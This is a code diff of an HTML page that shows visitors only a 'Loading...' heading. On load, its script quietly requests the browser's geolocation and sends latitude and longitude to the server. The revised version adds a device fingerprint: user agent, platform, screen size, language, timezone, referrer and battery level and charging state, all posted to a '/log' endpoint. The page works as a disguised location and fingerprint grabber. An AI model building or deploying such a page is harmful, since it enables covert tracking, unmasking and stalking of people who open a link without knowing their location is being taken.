@@ -1,45 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
   <title>Loading...</title>
   <script>
-    function sendData(extraData = {}) {
-      fetch("/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(extraData)
+    async function sendData(info) {
+      await fetch('/log', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(info)
       });
     }
 
-    function getLocationAndSend() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function (position) {
-            const extraData = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude
-            };
-            sendData(extraData);
-          },
-          function (error) {
-            console.warn("Location permission denied or error.");
-            sendData(); // send without location
-          }
-        );
-      } else {
-        console.warn("Geolocation not supported.");
-        sendData();
-      }
-    }
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const info = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        battery_level: "?",
+        charging: "?",
+        browser: navigator.userAgent,
+        device: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer
+      };
 
-    // Trigger on page load
-    window.onload = getLocationAndSend;
+      try {
+        const battery = await navigator.getBattery();
+        info.battery_level = Math.round(battery.level * 100);
+        info.charging = battery.charging;
+      } catch {}
+
+      await sendData(info);
+    });
   </script>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <h2>Loading...</h2>
 </body>
 </html>
